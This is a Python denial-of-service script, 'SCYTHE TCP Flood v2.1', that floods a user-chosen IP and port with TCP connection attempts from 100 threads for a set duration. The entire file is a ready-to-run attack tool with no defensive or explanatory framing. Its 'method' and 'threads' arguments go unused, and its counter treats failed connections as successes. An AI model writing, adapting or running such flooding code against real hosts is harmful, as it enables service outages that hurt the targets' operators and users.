# SCYTHE TCP Flood v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 5: print('Usage: python3 tcp.py <method> <ip> <port> <time> [threads]'); sys.exit(1)
method, ip, port, duration = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
print(f'[SCYTHE] TCP Flood: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(2); s.connect((ip, port)); total += 1; s.close()
    except: total += 1
for _ in range(100):
  threading.Thread(target=flood, daemon=True).start()
time.sleep(duration)
print(f'[TCP] Completed: {total} connections')